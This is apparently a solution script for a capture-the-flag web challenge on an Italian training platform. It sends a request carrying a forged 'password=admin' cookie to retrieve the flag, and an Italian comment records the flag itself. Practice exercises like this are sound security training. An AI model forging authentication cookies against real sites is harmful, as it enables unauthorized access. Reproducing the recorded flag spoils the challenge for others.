import requests
site = "http://web-05.challs.olicyber.it/flag"
req = requests.get(site, cookies={"password":"admin"}) # richiesta con cookie
print(req.text) # printo la richiesta (flag)
''' La flag di questa chall è: flag{v3ry_7457y_c00ki35} '''